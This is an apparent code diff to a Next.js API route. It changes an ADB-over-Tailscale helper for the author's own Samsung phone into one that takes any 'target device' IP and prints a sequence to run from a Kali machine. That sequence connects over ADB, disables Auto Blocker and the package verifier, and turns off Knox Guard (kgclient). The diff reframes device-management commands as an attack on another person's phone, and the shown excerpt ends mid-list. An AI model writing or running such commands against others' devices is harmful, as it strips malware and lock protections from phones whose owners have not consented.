@@ -516,12 +516,13 @@ export async function POST(request: Request) {
         data: { note: "Auto Blocker disabled. Sideloading and unknown sources now permitted." } });
     }
 
-    // ── Android: ADB over Tailscale instructions ────────────────
+    // ── Android: ADB over network instructions ────────────────
     if (action === "adb_tailscale") {
+      const targetIp = (body.target_ip as string) ?? "<TARGET_DEVICE_IP>";
       return NextResponse.json({ ok: true, data: {
-        note: "Your S24 is at 100.105.68.30 on Tailscale. Connect and run sequence:",
+        note: `ADB delivery to target device at ${targetIp}. Run sequence on your Kali machine:`,
         commands: [
-          "adb connect 100.105.68.30:5555",
+          `adb connect ${targetIp}:5555`,
           "adb shell settings put global auto_blocker_mode 0",
           "adb shell settings put global package_verifier_enable 0",
           "adb shell pm disable-user --user 0 com.samsung.android.kgclient",
